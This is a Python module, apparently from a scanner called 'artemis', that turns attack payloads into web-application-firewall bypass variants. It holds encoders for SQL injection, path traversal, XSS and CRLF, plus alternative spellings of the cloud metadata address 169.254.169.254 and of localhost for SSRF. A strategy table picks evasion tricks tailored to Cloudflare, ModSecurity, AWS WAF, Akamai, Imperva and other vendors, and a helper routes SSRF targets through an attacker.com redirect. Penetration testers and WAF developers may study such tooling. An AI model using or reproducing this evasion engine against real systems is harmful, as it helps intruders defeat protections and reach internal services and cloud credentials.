import base64
import random
import string
import struct
import urllib.parse
from typing import List, Optional

from artemis.waf_detect import WAFInfo, WAFType


def url_encode(payload: str) -> str:
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def unicode_encode(payload: str) -> str:
    return "".join(f"%u{ord(c):04x}" for c in payload)


def html_entity_encode(payload: str) -> str:
    return "".join(f"&#{ord(c)};" for c in payload)


def html_entity_hex_encode(payload: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in payload)


def hex_encode_string(payload: str) -> str:
    return "0x" + payload.encode().hex()


def base64_encode(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()


def utf16_encode(payload: str) -> str:
    return payload.encode("utf-16-le").hex()


def mixed_case(payload: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))


def random_case(payload: str) -> str:
    return "".join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)


def space_to_inline_comment(payload: str) -> str:
    return payload.replace(" ", "/**/")


def space_to_plus(payload: str) -> str:
    return payload.replace(" ", "+")


def space_to_newline(payload: str) -> str:
    return payload.replace(" ", "%0a")


def space_to_tab(payload: str) -> str:
    return payload.replace(" ", "%09")


def space_to_multiline_comment(payload: str) -> str:
    def _random_comment() -> str:
        chars = "".join(random.choices(string.ascii_lowercase, k=random.randint(1, 4)))
        return f"/*{chars}*/"
    return _random_comment().join(payload.split(" "))


def mysql_inline_comment(payload: str) -> str:
    parts = payload.split("(", 1)
    if len(parts) == 2:
        return f"/*!{parts[0]}*/({parts[1]}"
    return f"/*!{payload}*/"


def mysql_versioned_comment(payload: str) -> str:
    parts = payload.split("(", 1)
    version = random.choice(["50000", "50001", "40100", "40000"])
    if len(parts) == 2:
        return f"/*!{version}{parts[0]}*/({parts[1]}"
    return f"/*!{version}{payload}*/"


def between_encode(payload: str) -> str:
    result = payload.replace(">", " NOT BETWEEN 0 AND ")
    result = result.replace("=", " BETWEEN # AND #")
    return result


def concat_encode(payload: str) -> str:
    if len(payload) < 4:
        return payload
    mid = len(payload) // 2
    return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"


def add_random_comments(payload: str) -> str:
    result = []
    for c in payload:
        result.append(c)
        if c.isalpha() and random.random() > 0.5:
            result.append("/**/")
    return "".join(result)


def apostrophe_to_utf8_fullwidth(payload: str) -> str:
    return payload.replace("'", "%EF%BC%87")


def apostrophe_to_double_unicode(payload: str) -> str:
    return payload.replace("'", "%00%27")


def equal_to_like(payload: str) -> str:
    return payload.replace("=", " LIKE ")


def percentage_encode(payload: str) -> str:
    return "".join(f"%{c}" if c.isalpha() else c for c in payload)


def multiple_spaces(payload: str) -> str:
    return payload.replace(" ", " " * random.randint(3, 8))


def non_recursive_replacement(payload: str) -> str:
    keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "FROM", "WHERE",
        "sleep", "SLEEP", "concat", "CONCAT",
    ]
    result = payload
    for kw in keywords:
        if kw in result:
            mid = len(kw) // 2
            result = result.replace(kw, kw[:mid] + kw + kw[mid:])
    return result


def dot_double_encode(payload: str) -> str:
    return payload.replace("../", "%252e%252e%252f").replace("..\\", "%252e%252e%255c")


def utf8_overlong_dot(payload: str) -> str:
    return payload.replace("../", "%c0%ae%c0%ae/").replace("..\\", "%c0%ae%c0%ae\\")


def null_byte_inject(payload: str) -> str:
    return payload + "%00"


def path_double_slash(payload: str) -> str:
    return payload.replace("../", "..../").replace("..\\", "....\\")


def backslash_traversal(payload: str) -> str:
    return payload.replace("../", "..\\")


def mixed_slash_traversal(payload: str) -> str:
    return payload.replace("../", "..\\/")


def dot_segment_abuse(payload: str) -> str:
    return payload.replace("../", "./.././")


def unicode_fullwidth_slash(payload: str) -> str:
    return payload.replace("/", "%ef%bc%8f")


def unicode_fullwidth_dot(payload: str) -> str:
    return payload.replace("../", "%ef%bc%8e%ef%bc%8e/")


def ip_to_decimal(ip: str) -> str:
    try:
        parts = ip.split(".")
        if len(parts) == 4:
            return str(struct.unpack("!I", bytes(int(p) for p in parts))[0])
    except (ValueError, struct.error):
        pass
    return ip


def ip_to_hex(ip: str) -> str:
    try:
        parts = ip.split(".")
        if len(parts) == 4:
            return "0x" + "".join(f"{int(p):02x}" for p in parts)
    except ValueError:
        pass
    return ip


def ip_to_octal(ip: str) -> str:
    try:
        parts = ip.split(".")
        if len(parts) == 4:
            return ".".join(f"0{int(p):o}" for p in parts)
    except ValueError:
        pass
    return ip


def ip_to_ipv6_mapped(ip: str) -> str:
    return f"[::ffff:{ip}]"


def ip_to_ipv6_compressed(ip: str) -> str:
    try:
        parts = ip.split(".")
        if len(parts) == 4:
            hex_parts = [f"{int(p):02x}" for p in parts]
            return f"[0:0:0:0:0:ffff:{hex_parts[0]}{hex_parts[1]}:{hex_parts[2]}{hex_parts[3]}]"
    except ValueError:
        pass
    return ip


def localhost_alternatives(payload: str) -> str:
    alternatives = {
        "127.0.0.1": random.choice([
            "2130706433", "0x7f000001", "0177.0.0.01", "127.1", "127.0.1",
            "0x7f.0.0.1", "0177.0.0.1", "[::1]", "[::ffff:127.0.0.1]",
            "[0:0:0:0:0:ffff:127.0.0.1]", "0000::1", "127.000.000.001",
        ]),
        "localhost": random.choice([
            "127.0.0.1", "2130706433", "0x7f000001", "[::1]", "127.1",
            "localtest.me", "spoofed.burpcollaborator.net",
        ]),
        "169.254.169.254": random.choice([
            "0xa9fea9fe", "2852039166", "0251.0376.0251.0376",
            "[::ffff:169.254.169.254]", "169.254.169.254.nip.io",
            "0xa9.0xfe.0xa9.0xfe",
        ]),
    }
    result = payload
    for original, replacement in alternatives.items():
        if original in result:
            result = result.replace(original, replacement)
    return result


def ssrf_url_encode(payload: str) -> str:
    return payload.replace("://", "%3A%2F%2F").replace("/", "%2F")


def ssrf_redirect_wrapper(payload: str) -> str:
    return f"http://attacker.com/redirect?url={urllib.parse.quote(payload, safe='')}"


def randomize_header_case(headers: dict) -> dict:
    result = {}
    for key, value in headers.items():
        new_key = "".join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in key)
        result[new_key] = value
    return result


def add_noise_params(url: str) -> str:
    noise = "".join(random.choices(string.ascii_lowercase, k=6))
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}{noise}={random.randint(1, 9999)}"


def add_fake_path_info(url: str) -> str:
    if "?" in url:
        base, query = url.split("?", 1)
        fake = "".join(random.choices(string.ascii_lowercase, k=4))
        return f"{base}/{fake}/..?{query}"
    return url


def http_parameter_pollution(url: str, param: str, payload: str) -> str:
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}{param}=safe&{param}={payload}"


def content_type_charset_bypass(charset: str = "ibm037") -> dict:
    return {"Content-Type": f"application/x-www-form-urlencoded; charset={charset}"}


def ibm037_encode(payload: str) -> str:
    try:
        return urllib.parse.quote_plus(payload.encode("IBM037"))
    except (UnicodeEncodeError, LookupError):
        return payload


WAF_STRATEGIES = {
    WAFType.CLOUDFLARE: {
        "sqli": [double_url_encode, unicode_encode, space_to_inline_comment, mysql_versioned_comment, random_case],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot, unicode_fullwidth_slash],
        "xss": [double_url_encode, html_entity_encode, unicode_encode, html_entity_hex_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, double_url_encode, ssrf_url_encode],
        "generic": [double_url_encode, unicode_encode, random_case],
    },
    WAFType.MODSECURITY: {
        "sqli": [mysql_inline_comment, space_to_inline_comment, add_random_comments,
                 mysql_versioned_comment, apostrophe_to_utf8_fullwidth, non_recursive_replacement],
        "lfi": [utf8_overlong_dot, dot_double_encode, null_byte_inject, dot_segment_abuse],
        "xss": [html_entity_encode, unicode_encode, double_url_encode, html_entity_hex_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [space_to_inline_comment, double_url_encode, mysql_inline_comment],
    },
    WAFType.AWS_WAF: {
        "sqli": [unicode_encode, space_to_inline_comment, mixed_case, mysql_versioned_comment,
                 apostrophe_to_double_unicode],
        "lfi": [double_url_encode, utf8_overlong_dot, dot_double_encode, unicode_fullwidth_slash],
        "xss": [unicode_encode, html_entity_encode, double_url_encode, html_entity_hex_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, double_url_encode, mixed_case],
    },
    WAFType.CLOUDFRONT: {
        "sqli": [unicode_encode, double_url_encode, space_to_inline_comment, random_case],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, double_url_encode],
    },
    WAFType.AKAMAI: {
        "sqli": [space_to_newline, mysql_inline_comment, random_case, space_to_tab,
                 mysql_versioned_comment, percentage_encode],
        "lfi": [dot_double_encode, utf8_overlong_dot, double_url_encode, unicode_fullwidth_dot],
        "xss": [html_entity_encode, unicode_encode, double_url_encode, html_entity_hex_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, double_url_encode, unicode_encode],
        "generic": [space_to_newline, double_url_encode, random_case],
    },
    WAFType.IMPERVA: {
        "sqli": [space_to_inline_comment, mysql_inline_comment, unicode_encode,
                 apostrophe_to_utf8_fullwidth, equal_to_like, non_recursive_replacement],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot, null_byte_inject],
        "xss": [unicode_encode, html_entity_encode, double_url_encode, html_entity_hex_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [space_to_inline_comment, unicode_encode, mysql_inline_comment],
    },
    WAFType.SUCURI: {
        "sqli": [double_url_encode, space_to_inline_comment, mysql_inline_comment,
                 mysql_versioned_comment, apostrophe_to_utf8_fullwidth],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot, path_double_slash],
        "xss": [double_url_encode, html_entity_encode, unicode_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, double_url_encode, unicode_encode],
        "generic": [double_url_encode, space_to_inline_comment],
    },
    WAFType.F5_BIG_IP: {
        "sqli": [unicode_encode, space_to_inline_comment, random_case, mysql_versioned_comment,
                 multiple_spaces, percentage_encode],
        "lfi": [utf8_overlong_dot, double_url_encode, dot_double_encode, backslash_traversal],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, space_to_inline_comment, random_case],
    },
    WAFType.WORDFENCE: {
        "sqli": [double_url_encode, space_to_inline_comment, mysql_inline_comment,
                 apostrophe_to_utf8_fullwidth, non_recursive_replacement],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot, null_byte_inject],
        "xss": [double_url_encode, html_entity_encode, unicode_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, double_url_encode, unicode_encode],
        "generic": [double_url_encode, space_to_inline_comment],
    },
    WAFType.BARRACUDA: {
        "sqli": [space_to_inline_comment, unicode_encode, mysql_versioned_comment, random_case],
        "lfi": [double_url_encode, utf8_overlong_dot, dot_double_encode],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [space_to_inline_comment, unicode_encode],
    },
    WAFType.FORTIWEB: {
        "sqli": [unicode_encode, space_to_inline_comment, mysql_inline_comment, random_case],
        "lfi": [double_url_encode, utf8_overlong_dot, dot_double_encode],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, space_to_inline_comment],
    },
    WAFType.FASTLY: {
        "sqli": [double_url_encode, space_to_inline_comment, random_case, unicode_encode],
        "lfi": [double_url_encode, dot_double_encode, utf8_overlong_dot],
        "xss": [double_url_encode, html_entity_encode, unicode_encode],
        "crlf": [double_url_encode, unicode_encode],
        "ssrf": [localhost_alternatives, double_url_encode, unicode_encode],
        "generic": [double_url_encode, unicode_encode],
    },
    WAFType.CITRIX_NETSCALER: {
        "sqli": [unicode_encode, space_to_inline_comment, mysql_versioned_comment, random_case],
        "lfi": [utf8_overlong_dot, double_url_encode, dot_double_encode],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, space_to_inline_comment],
    },
    WAFType.RADWARE: {
        "sqli": [space_to_inline_comment, unicode_encode, mysql_inline_comment, random_case],
        "lfi": [double_url_encode, utf8_overlong_dot, dot_double_encode],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [space_to_inline_comment, unicode_encode],
    },
    WAFType.PALO_ALTO: {
        "sqli": [unicode_encode, double_url_encode, space_to_inline_comment, random_case],
        "lfi": [double_url_encode, utf8_overlong_dot, dot_double_encode],
        "xss": [unicode_encode, html_entity_encode, double_url_encode],
        "crlf": [unicode_encode, double_url_encode],
        "ssrf": [localhost_alternatives, unicode_encode, double_url_encode],
        "generic": [unicode_encode, double_url_encode],
    },
}

DEFAULT_STRATEGY = {
    "sqli": [url_encode, space_to_inline_comment, mixed_case, double_url_encode, mysql_inline_comment],
    "lfi": [url_encode, double_url_encode, dot_double_encode, utf8_overlong_dot, null_byte_inject],
    "xss": [url_encode, html_entity_encode, double_url_encode, unicode_encode],
    "crlf": [url_encode, double_url_encode, unicode_encode],
    "ssrf": [localhost_alternatives, url_encode, double_url_encode, unicode_encode],
    "generic": [url_encode, double_url_encode, unicode_encode, mixed_case],
}


def get_bypass_payloads(payload: str, waf_info: Optional[WAFInfo] = None, context: str = "generic") -> List[str]:
    results = [payload]

    if waf_info is None or not waf_info.detected:
        return results

    strategy = WAF_STRATEGIES.get(waf_info.waf_type, DEFAULT_STRATEGY)
    transforms = strategy.get(context, strategy.get("generic", DEFAULT_STRATEGY.get("generic", [])))

    for transform in transforms:
        try:
            encoded = transform(payload)
            if encoded != payload and encoded not in results:
                results.append(encoded)
        except Exception:
            continue

    return results


def apply_bypass(payload: str, waf_info: Optional[WAFInfo] = None, context: str = "generic") -> str:
    if waf_info is None or not waf_info.detected:
        return payload

    strategy = WAF_STRATEGIES.get(waf_info.waf_type, DEFAULT_STRATEGY)
    transforms = strategy.get(context, strategy.get("generic", DEFAULT_STRATEGY.get("generic", [])))

    for transform in transforms:
        try:
            encoded = transform(payload)
            if encoded != payload:
                return encoded
        except Exception:
            continue

    return payload


def get_ssrf_ip_variants(ip: str) -> List[str]:
    variants = [ip]

    try:
        decimal = ip_to_decimal(ip)
        if decimal != ip:
            variants.append(decimal)
    except Exception:
        pass

    try:
        hex_ip = ip_to_hex(ip)
        if hex_ip != ip:
            variants.append(hex_ip)
    except Exception:
        pass

    try:
        octal = ip_to_octal(ip)
        if octal != ip:
            variants.append(octal)
    except Exception:
        pass

    variants.append(ip_to_ipv6_mapped(ip))
    variants.append(ip_to_ipv6_compressed(ip))

    parts = ip.split(".")
    if len(parts) == 4:
        try:
            if parts[1] == "0" and parts[2] == "0":
                variants.append(f"{parts[0]}.{parts[3]}")
            variants.append(".".join(f"{int(p):03d}" for p in parts))
            variants.append(".".join(f"0x{int(p):x}" for p in parts))
        except ValueError:
            pass

    return list(dict.fromkeys(variants))
